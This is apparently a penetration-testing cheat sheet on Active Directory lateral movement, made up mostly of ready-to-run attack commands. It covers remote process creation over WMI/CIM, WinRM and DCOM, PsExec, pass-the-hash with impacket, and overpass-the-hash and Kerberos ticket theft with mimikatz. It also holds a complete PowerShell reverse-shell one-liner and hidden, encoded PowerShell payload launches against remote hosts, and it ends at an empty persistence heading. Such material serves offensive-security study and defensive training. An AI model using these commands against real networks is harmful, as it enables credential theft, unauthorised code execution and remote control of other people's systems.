# AD Lateral Movement

We will explore different lateral movement techniques that permit us to authenticate to a system and gain code execution **using a user's hash or a Kerberos ticket**.

* WMI, WinRS, and WinRM Lateral Movement Techniques
* PsExec for Lateral Movement
* Learn about Pass The Hash and 
* Overpass The Hash as Lateral Movement Techniques
* Misuse DCOM to Move Laterally
* Active Directory Persistence

## AD Movement using Powershell CIM Session or WMIC

* WMI uses port 135 for communication with remote procedure calls (RPC)
* wmic is deprecated since Windows 10, version 21H1 use powershell instead

Scenario:

* **Requirement**: User credentials for **local Administrator** group on a remote target
* **Limitation**: Avoid [UAC remote Restriction](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction#domain-user-accounts-active-directory-user-account) by using a **AD user** or disable the windows feature using windwos registry
* **Limitation**:System processes and services always run in [session 0](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361)

Attacker


```powershell
$username = 'user';
$password = 'password!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

# Start remote process via Cim session using DCOM
$command = 'notepad';
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 10.0.10.30 -Credential $credential -SessionOption $Options 
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

PS reverse shell as command

```powershell
$Shell = '$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Shell > powershell-reverse-shell.ps1
```

```python
python3 tools/ps-encode.py -s powershell-reverse-shell.ps1
```

```powershell

# Start PS reverse shell via Cim session
$payload = '';
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 10.0.10.30 -Credential $credential -SessionOption $Options 
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$payload};
```

Alternative

* /node:target-ip
* /user
* /password
* process call create "process to create on remote target"

```powershell
wmic /node:10.0.10.30 /user:username /password:password! process call create "notepad"
wmic /node:10.0.10.30 /user:username /password:password! process call create "powershell -nop -w hidden -e JABjAGwAaQBl..."
```

## AD Movement using WinRM Powershell Remoting or WinRS

* WinRM TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP
* Exchanges XML using the WS-Management protocol
* How to [WinRS](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs)

Scenario

* **Requirement**: User credentials for **local Administrator** group on a remote target
* **Limitation**: Only works for **domain users**

Attacker

```powershell
$username = 'user';
$password = 'password!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

# Powershell remoting
New-PSSession -ComputerName 10.0.10.30 -Credential $credential

Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
1 WinRM1          10.0.10.30   RemoteMachine   Opened  

# Enter session
Enter-PSSession 1
whoami


```

Alternative

```powershell
winrs -r:targetname -u:username -p:password!  "cmd /c hostname & whoami"
winrs -r:target -u:username -p:password!  "powershell -nop -w hidden -e JABjAGwAaQBl..."
```

## AD Movement with PSExec

* Remote execution of processes with PSExec from [Sysinternals Live](https://live.sysinternals.com/)
* Interactive Console support for lateral movement
* Writes psexesvc.exe into C:\Windows directory
* Creates and spawns a service on the target host
* Runs the requested program/command as a child process of psexesvc.exe

Scenario

* Requires: User credentials for **local Administrator** group on a remote target
* Requires: **ADMIN$ share** available and **File & Printer Sharing** active (default on Windows Server)

Attacker

* -i interactive session
* -s NT authority

```powershell

.\PsExec64.exe -i  \\WEB01 -u example.com\user -p password! powershell
```

## AD Movement with Pass-the-Hash (PtH)

* Connect via SMB port 445 through firewall
* Start a windows service and communicate via Named pipes

Many 3rd-party tools and frameworks use PtH to allow users to both authenticate and obtain code execution:

* PsExec from Metasploit
* Passing-the-hash toolkit
* Impacket-x (kali)

Scenario

* Requires: user and **NTLM hash** for AD user within **local Administrator** group on a remote target
* Requires: **ADMIN$ share** available and **File & Printer Sharing** active (default on Windows Server)
* Limitation: **NTLM authentication** only, Kerberos is not supported


```shell
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@10.1.2.3
/usr/bin/impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@10.1.2.3

```

## AD Movement with NTLM over pass-the-hash (oPtH) to create Kerberos TGTs

The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket.

* **Inject stolen NTLM hash into memory** with sekurlsa::pth
* wipeout other NTLM hashes with sekurlsa::ekeys (eliminate keys)
* create a new TGT using NT hash only
* [Overpass-the-hash](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf) to get Kerberos ticket

Scenario

* Requires: User **NTLM hash** for AD user within **local Administrator** group on a remote target
* Obtain Kerberos tickets **without performing NTLM authentication** over the network

Attacker

```powershell

# Use mimekatz open powershell with different user using NTLM hash
sekurlsa::pth /user:Administrator /domain:example.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
sekurlsa::ekeys
```

```powershell
# Obtain a kerberos ticket for Administrator
net use \\web01

# List cifs service ticket (TGS)
klist
  Cached Tickets: (2)
  
  Client: Administrator@ EXAMPLE.COM
  Server: krbtgt/EXAMPLE.COM @ EXAMPLE.COM
  ...
  Client: Administrator@ EXAMPLE.COM
  Server: cifs/web01 @ EXAMPLE.COM

# Perform laterial movement using the kerberos ticket
PSExec.exe \\web01 powershell

whoami 
example\Administrator
```

## AD Movement with TGS pass the kerberos ticket

The objecive is to export service tickets (TGS) and reuse them across different systems.

Scenario

* Require: No **administrative privileges** if the service tickets belong to the current user
* Extract all the current TGT/TGS in memory and inject a someuser WEB01 TGS into our own session

Attacker

```powershell
# Use mimikatz to export tickets of logged on users
privilege::debug
sekurlsa::tickets /export

# List extracted ticket in mimikatz kirbi format
dir *.kirbi

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-someuser@cifs-web01.kirbi

# Inject the kerberos ticket into own session memory
kerberos::ptt [0;12bd0]-0-0-40810000-someuser@cifs-web04.kirbi

# Access the resource with the stolen ticket
ls \\web01\backup

```

## AD Movement with DCOM Remote Services

Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods.

* Connect via RPC on TCP port 135 through firewall
* By default, only Administrators may remotely activate and launch COM objects through DCOM.
* Permissions to interact with COM objects are specified by access control lists (ACL) in the Registry.
* [DCOM Remote Services](https://attack.mitre.org/techniques/T1021/003/)

Scenario

* Require: AD user within **local Administrator** group on a remote target
* Use [MMC application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) for lateral movement using DCOM
* Use [Powershell-Empire](https://attack.mitre.org/software/S0363) or [SilentTrinity](https://attack.mitre.org/software/S0692) post-exploitation frameworks

Attacker

```powershell
# Run program with MMC20.Application DCOM ojbect
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","target-ip"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c notepad","7");

# Run PS reserse shell to connect to attacker kali machine
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD...","7")
```

## Active Directory Persistence